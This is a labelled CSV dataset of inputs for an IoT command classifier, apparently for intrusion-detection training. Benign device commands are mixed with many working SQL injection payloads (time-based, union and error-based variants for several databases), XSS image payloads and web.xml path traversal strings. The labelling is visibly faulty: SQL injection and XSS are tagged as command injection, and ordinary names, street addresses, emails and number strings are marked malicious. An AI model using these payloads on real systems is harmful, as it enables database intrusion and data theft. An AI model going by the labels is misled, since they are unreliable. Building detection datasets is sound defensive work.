payload,label,attack_type
"1) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)",malicious,cmdi
"run_cmd, ADD 479 779",benign,norm
"1'||(select 'qdkb' where 4331=4331;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5))||'",malicious,cmdi
quijar,malicious,cmd_parse_error
"<img src=javascript:alert(string.fromcharcode(88,83,83))>",malicious,xss
"run_cmd, ADD 753 76",benign,norm
583no,malicious,cmd_parse_error
"echo, ['data', 'report']",benign,norm
-3938%'))) or 2034=7209#,malicious,cmd_parse_error
"1"" or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)",malicious,cmdi
dionisio@bijoubijoudiferente.tv,malicious,cmd_parse_error
"start_temp_report, 68",benign,norm
"start_temp_report, 72",benign,norm
pericak,malicious,cmd_parse_error
"run_cmd, echo ['payload', 'report', 'sensor']",benign,norm
"start_temp_report, 106",benign,norm
"start_temp_report, 104",benign,norm
81180031j,malicious,cmd_parse_error
"run_cmd, ADD 663 258",benign,norm
"run_cmd, echo ['payload', 'mqtt', 'iot']",benign,norm
"1'+(select 'ycvl' where 8415=8415 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",malicious,cmdi
zack,malicious,cmd_parse_error
"start_temp_report, 17",benign,norm
canut escriba,malicious,cmd_parse_error
"echo, ['system', 'esp32', 'device', 'ping']",benign,norm
"start_temp_report, 105",benign,norm
"1' where 3339=3339 and 3824=benchmark(5000000,md5(0x76555642))--",malicious,cmd_parse_error
rgiva,malicious,cmd_parse_error
"run_cmd, echo ['device', 'data']",benign,norm
"1,(convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4932=4932) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))))",malicious,cmd_parse_error
"echo, ['iot', 'payload', 'hello', 'sensor']",benign,norm
43320,malicious,cmd_parse_error
"start_temp_report, 10",benign,norm
"run_cmd, echo ['world', 'system', 'hello', 'status']",benign,norm
"run_cmd, ADD 84 532",benign,norm
"run_cmd, echo ['esp32', 'sensor', 'mqtt', 'ping']",benign,norm
"echo, ['ok']",benign,norm
"echo, ['hello']",benign,norm
"1%"" or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",malicious,cmd_parse_error
maila,malicious,cmd_parse_error
"echo, ['ping', 'mqtt', 'data']",benign,norm
1943374801106050,malicious,cmd_parse_error
dept.,malicious,cmd_parse_error
"1%""));select count(*) from generate_series(1,5000000)--",malicious,cmdi
"1') as siyk where 1514=1514 union all select null,null,null,null,null,null#",malicious,cmd_parse_error
8704154782235200,malicious,cmd_parse_error
"calle limones, 60,",malicious,cmd_parse_error
"1%"") and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (""%""=""",malicious,cmdi
7676907583941560,malicious,cmd_parse_error
tajamar,malicious,cmd_parse_error
"start_temp_report, 85",benign,norm
"start_temp_report, 58",benign,norm
"run_cmd, echo ['hello']",benign,norm
"start_temp_report, 108",benign,norm
"echo, ['hello']",benign,norm
43736,malicious,cmd_parse_error
"run_cmd, echo ['mqtt']",benign,norm
ha3fila,malicious,cmd_parse_error
"1'));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and (('xlvt'='xlvt",malicious,cmdi
"echo, ['ok', 'status', 'data', 'payload']",benign,norm
"1"" and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ""qqfd"" like ""qqfd",malicious,cmdi
witting@videotubo.cl,malicious,cmd_parse_error
"1%') or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",malicious,cmdi
"echo, ['device', 'ok', 'safe', 'payload']",benign,norm
18210,malicious,cmd_parse_error
"run_cmd, echo ['device', 'ping']",benign,norm
"echo, ['ok', 'esp32', 'report', 'status']",benign,norm
pablo iglesias s/n 2?f,malicious,cmd_parse_error
1646619450025550,malicious,cmd_parse_error
"start_temp_report, 55",benign,norm
"start_temp_report, 99",benign,norm
"run_cmd, ADD 326 521",benign,norm
"-1653 union all select 8415,8415,8415,8415,8415,8415,8415,8415#",malicious,cmd_parse_error
....web-infweb.xml,malicious,cmd_parse_error
"start_temp_report, 49",benign,norm
9437,malicious,cmd_parse_error
"run_cmd, ADD 858 208",benign,norm
"run_cmd, ADD 260 232",benign,norm
"start_temp_report, 40",benign,norm
"run_cmd, echo ['payload']",benign,norm
"echo, ['mqtt']",benign,norm
"run_cmd, ADD 426 751",benign,norm
postema,malicious,cmd_parse_error
21392437e,malicious,cmd_parse_error
"1'||(select 'gtri' from dual where 7097=7097 and elt(1210=1210,sleep(5)))||'",malicious,cmdi
"1 and elt(8853=1675,1675)-- jegm",malicious,cmd_parse_error
"run_cmd, echo ['esp32']",benign,norm
"run_cmd, ADD 47 673",benign,norm
"run_cmd, ADD 608 552",benign,norm
"start_temp_report, 116",benign,norm
"1%') union all select null,null,null,null,null,null,null#",malicious,cmd_parse_error
"run_cmd, ADD 572 493",benign,norm
"run_cmd, echo ['world', 'data']",benign,norm
1' and 6969=(select 6969 from pg_sleep(5)) and 'lqsa' like 'lqsa,malicious,cmd_parse_error
"echo, ['normal']",benign,norm
"echo, ['esp32']",benign,norm
3916,malicious,cmd_parse_error
"start_temp_report, 4",benign,norm
6052,malicious,cmd_parse_error
johan,malicious,cmd_parse_error
"1%'))) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((('%'='",malicious,cmd_parse_error
"1%"" union all select null,null,null,null,null,null,null,null,null,null#",malicious,cmd_parse_error
"1')) as qqvk where 1007=1007;select * from generate_series(3379,3379,case when (3379=1219) then 1 else 0 end) limit 1--",malicious,cmdi
"run_cmd, echo ['ok']",benign,norm
villasandino,malicious,cmd_parse_error
"run_cmd, echo ['ping', 'esp32', 'hello']",benign,norm
"start_temp_report, 77",benign,norm
"start_temp_report, 71",benign,norm
1'||(select 'bupa' from dual where 8548=8548;select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,malicious,cmdi
46439230e,malicious,cmd_parse_error
"1%"" or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",malicious,cmd_parse_error
"run_cmd, echo ['hello', 'mqtt', 'data']",benign,norm
"run_cmd, echo ['ready', 'sensor', 'normal']",benign,norm
"echo, ['mqtt', 'sensor', 'ready', 'report']",benign,norm
"run_cmd, ADD 684 277",benign,norm
"1'));call regexp_substring(repeat(right(char(2385),0),500000000),null)--",malicious,cmdi
"carlos arniches 78,",malicious,cmd_parse_error
"echo, ['sensor', 'device', 'mqtt', 'payload']",benign,norm
8737153386823279,malicious,cmd_parse_error
federico,malicious,cmd_parse_error
"run_cmd, ADD 835 902",benign,norm
"1) union all select null,null,null,null,null--",malicious,cmd_parse_error
78717162f,malicious,cmd_parse_error
"-4515"") or elt(4545=2509,2509) and (""lglx""=""lglx",malicious,cmd_parse_error
"run_cmd, echo ['normal', 'system', 'sensor']",benign,norm
"run_cmd, ADD 670 830",benign,norm
"run_cmd, ADD 130 520",benign,norm
"echo, ['safe', 'mqtt']",benign,norm
"1)) as zdbj where 2300=2300 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))--",malicious,cmdi
"echo, ['device']",benign,norm
"run_cmd, echo ['mqtt', 'sensor', 'hello']",benign,norm
"start_temp_report, 79",benign,norm
"echo, ['safe', 'world']",benign,norm
"start_temp_report, 50",benign,norm
canillas de ro tuerto,malicious,cmd_parse_error
tagle isurieta,malicious,cmd_parse_error
44369,malicious,cmd_parse_error
"run_cmd, echo ['payload']",benign,norm
"echo, ['world', 'device']",benign,norm
6486,malicious,cmd_parse_error
"start_temp_report, 80",benign,norm
"echo, ['ok', 'hello']",benign,norm
"echo, ['hello']",benign,norm
1%' waitfor delay '0:0:5'--,malicious,cmd_parse_error
"start_temp_report, 9",benign,norm
"echo, ['ready', 'system', 'iot']",benign,norm
"run_cmd, echo ['device']",benign,norm
"avda. juan carlos i, 195, 6f",malicious,cmd_parse_error
"echo, ['data', 'hello', 'device', 'ping']",benign,norm
"echo, ['ping', 'hello']",benign,norm
"run_cmd, echo ['ready']",benign,norm
"run_cmd, ADD 56 13",benign,norm
"-3729')) or elt(4482=2648,2648) and (('vkkr' like 'vkkr",malicious,cmd_parse_error
1)) as quap where 7625=7625;select (case when (4568=4241) then 4568 else cast(1 as int)/(select 0 from dual) end) from dual--,malicious,cmdi
hixson,malicious,cmd_parse_error
"echo, ['payload']",benign,norm
"1"") and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",malicious,cmd_parse_error
9740,malicious,cmd_parse_error
"run_cmd, echo ['ping', 'safe', 'iot']",benign,norm
handal hach,malicious,cmd_parse_error
51942267x,malicious,cmd_parse_error
"1)) as spdf where 8554=8554 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)--",malicious,cmdi
"1"")) rlike (select * from (select(sleep(5)))sgvo) and ((""bxct"" like ""bxct",malicious,cmd_parse_error
"run_cmd, echo ['device']",benign,norm
althea4,malicious,cmd_parse_error
"echo, ['status', 'hello', 'world', 'mqtt']",benign,norm
73672811q,malicious,cmd_parse_error
"1')) and 8407=(select count(*) from generate_series(1,5000000)) and (('dfsj'='dfsj",malicious,cmd_parse_error
-7199'||(select 'ssty' where 5406=5406 order by 1#,malicious,cmdi
"echo, ['status', 'system']",benign,norm
"echo, ['device', 'system', 'data', 'payload']",benign,norm
ferreries,malicious,cmd_parse_error
imparato.inch@flexinspect.tc,malicious,cmd_parse_error
santa clara de avedillo,malicious,cmd_parse_error
"run_cmd, ADD 526 337",benign,norm
godayol iafrate,malicious,cmd_parse_error
"start_temp_report, 119",benign,norm
calle bernat metge 10,malicious,cmd_parse_error
"echo, ['ok']",benign,norm
"ciri, 23, 5?a",malicious,cmd_parse_error
"1' or 8466=benchmark(5000000,md5(0x694a4745))",malicious,cmd_parse_error
jandtegui curell,malicious,cmd_parse_error
arnaldo,malicious,cmd_parse_error
"run_cmd, echo ['payload', 'status', 'hello']",benign,norm
"start_temp_report, 94",benign,norm
15801,malicious,cmd_parse_error
"run_cmd, echo ['hello', 'report', 'payload', 'world']",benign,norm
lucila2,malicious,cmd_parse_error
1)));select sleep(5)#,malicious,cmdi
"run_cmd, echo ['report', 'ready', 'world']",benign,norm
"echo, ['data']",benign,norm
"run_cmd, ADD 154 343",benign,norm
"pl. vianako printzearen, 107 12h",malicious,cmd_parse_error
"1"");select pg_sleep(5)--",malicious,cmdi
01062744y,malicious,cmd_parse_error
"-6436' in boolean mode) union all select 7589,7589,7589,7589--",malicious,cmd_parse_error
"carretera estacion, 144, 8-d",malicious,cmd_parse_error
"1) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and (5621=5621",malicious,cmdi
"1%')));select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",malicious,cmdi
"1%'));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",malicious,cmdi
"1 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",malicious,cmd_parse_error
"run_cmd, ADD 973 161",benign,norm
5916923920449303,malicious,cmd_parse_error
"run_cmd, echo ['payload', 'normal']",benign,norm
"calle joaquin gamon 175, 2-c",malicious,cmd_parse_error
jusmeter-se,malicious,cmd_parse_error
"echo, ['ready']",benign,norm
"1%"")) union all select null,null--",malicious,cmd_parse_error
idt,malicious,cmd_parse_error
nagy4,malicious,cmd_parse_error
"echo, ['esp32']",benign,norm
"echo, ['system', 'iot']",benign,norm
"run_cmd, ADD 313 238",benign,norm
20560,malicious,cmd_parse_error
"start_temp_report, 38",benign,norm
rom87231o,malicious,cmd_parse_error
"run_cmd, echo ['mqtt']",benign,norm
"alicante 119,",malicious,cmd_parse_error
ostapovich furnari,malicious,cmd_parse_error
1'+(select tzvm where 5145=5145 and 4192=7437#,malicious,cmd_parse_error
"start_temp_report, 9",benign,norm
"1') where 3330=3330 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",malicious,cmdi
"run_cmd, echo ['mqtt', 'safe']",benign,norm
revacunacin,malicious,cmd_parse_error
27268,malicious,cmd_parse_error
guinon,malicious,cmd_parse_error
"start_temp_report, 37",benign,norm
"echo, ['mqtt', 'sensor', 'iot', 'esp32']",benign,norm
"1%"")));if(7899=7899) select 7899 else drop function zbbp--",malicious,cmdi
"passatge permanyer, 53, 7d",malicious,cmd_parse_error
"calle dean miranda 106, 6-f",malicious,cmd_parse_error
"start_temp_report, 91",benign,norm
"start_temp_report, 22",benign,norm
"run_cmd, echo ['ping', 'ok', 'ready']",benign,norm
caball,malicious,cmd_parse_error
5738656777316429,malicious,cmd_parse_error
c/ guillen santacilla 94,malicious,cmd_parse_error
"echo, ['mqtt', 'data', 'ping', 'ok']",benign,norm
11615910j,malicious,cmd_parse_error
puebla de arenoso,malicious,cmd_parse_error
"run_cmd, echo ['ok', 'iot', 'hello', 'normal']",benign,norm
"run_cmd, echo ['mqtt', 'system']",benign,norm
51734480m,malicious,cmd_parse_error
"run_cmd, ADD 579 61",benign,norm
"echo, ['iot', 'status']",benign,norm
"echo, ['status']",benign,norm
"-4919) union all select 2608,2608,2608,2608,2608,2608#",malicious,cmd_parse_error
"start_temp_report, 54",benign,norm
deolinda,malicious,cmd_parse_error
41953346n,malicious,cmd_parse_error
"echo, ['system']",benign,norm
"run_cmd, echo ['hello', 'sensor', 'device', 'system']",benign,norm
"echo, ['normal']",benign,norm
"run_cmd, echo ['normal', 'ping', 'status', 'device']",benign,norm
1914,malicious,cmd_parse_error
domenge canelas,malicious,cmd_parse_error
"1' and elt(1210=1210,sleep(5))",malicious,cmd_parse_error
"1"" or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and ""deeu"" like ""deeu",malicious,cmd_parse_error
"run_cmd, echo ['normal', 'data', 'system']",benign,norm
2095,malicious,cmd_parse_error
"start_temp_report, 39",benign,norm
"echo, ['device', 'ok', 'ready', 'status']",benign,norm
calvin@espaciodelpintor.by,malicious,cmd_parse_error
"run_cmd, echo ['hello', 'ping', 'payload', 'safe']",benign,norm
"start_temp_report, 80",benign,norm
-8045))) order by 1--,malicious,cmd_parse_error
"<img id=xss src="" javascript:alert('xss');"">",malicious,cmdi
"run_cmd, echo ['world']",benign,norm
"run_cmd, echo ['sensor']",benign,norm
"run_cmd, ADD 530 279",benign,norm
"run_cmd, echo ['sensor']",benign,norm
"run_cmd, ADD 756 105",benign,norm
"run_cmd, ADD 394 732",benign,norm
"run_cmd, echo ['esp32', 'sensor']",benign,norm
"echo, ['esp32', 'world', 'safe', 'device']",benign,norm
"echo, ['sensor', 'safe', 'data']",benign,norm
"run_cmd, echo ['payload', 'report']",benign,norm
"run_cmd, ADD 239 366",benign,norm
francisk,malicious,cmd_parse_error
"run_cmd, echo ['hello']",benign,norm
-6081 where 3681=3681 or 2603=3138--,malicious,cmd_parse_error
"1"") and 7533=7533 and (""yqzq""=""yqzq",malicious,cmd_parse_error
"start_temp_report, 32",benign,norm
c/ buenos aires s/n 6?b,malicious,cmd_parse_error
"-3441')) as dxvt where 9291=9291 union all select 9291,9291,9291#",malicious,cmd_parse_error
24806506v,malicious,cmd_parse_error
mouchet@007tv.fj,malicious,cmd_parse_error
"echo, ['payload', 'safe', 'world']",benign,norm
"start_temp_report, 39",benign,norm
pike@multasdetransito.gf,malicious,cmd_parse_error
baquerizo amatll,malicious,cmd_parse_error
8787472125390389,malicious,cmd_parse_error
"calle kresaltxu 94, 3?b",malicious,cmd_parse_error
"c/ del ferrocarril, 152,",malicious,cmd_parse_error
calle fermin salvochea 155,malicious,cmd_parse_error
"-7184) as fshx where 3408=3408 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",malicious,cmdi
8624528544448425,malicious,cmd_parse_error
"run_cmd, echo ['safe', 'esp32', 'ping']",benign,norm
"run_cmd, echo ['payload']",benign,norm
17,malicious,cmd_parse_error
"echo, ['sensor']",benign,norm
eduviges,malicious,cmd_parse_error
"run_cmd, echo ['ping', 'system', 'data', 'mqtt']",benign,norm
"run_cmd, echo ['normal', 'data', 'payload', 'ping']",benign,norm
"run_cmd, ADD 702 305",benign,norm
"run_cmd, ADD 287 640",benign,norm
"echo, ['report']",benign,norm
"echo, ['hello']",benign,norm
"1'))) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and ((('wnzv'='wnzv",malicious,cmd_parse_error
"1%') and make_set(8403=8403,8899) and ('%'='",malicious,cmd_parse_error
"run_cmd, echo ['system', 'data', 'ok', 'safe']",benign,norm
"1"") where 9827=9827;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",malicious,cmdi
condensativo,malicious,cmd_parse_error
"run_cmd, ADD 154 486",benign,norm
"1'+(select hspl where 4530=4530 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",malicious,cmd_parse_error
"start_temp_report, 69",benign,norm
"start_temp_report, 15",benign,norm
"1"" and make_set(8403=8403,8899)",malicious,cmd_parse_error
"echo, ['normal', 'data', 'iot']",benign,norm
"start_temp_report, 62",benign,norm
"start_temp_report, 103",benign,norm
yoel,malicious,cmd_parse_error
/....//....//web-inf/web.xml,malicious,cmd_parse_error
teruel,malicious,cmd_parse_error
"echo, ['ping']",benign,norm
"vinyals, 117 4?e",malicious,cmd_parse_error
9ig7a2i4,malicious,cmd_parse_error
mozek,malicious,cmd_parse_error
7857158360903973,malicious,cmd_parse_error
"calle carre clot 93,",malicious,cmd_parse_error
"calle diamante, 57",malicious,cmd_parse_error
"run_cmd, echo ['report', 'ok']",benign,norm
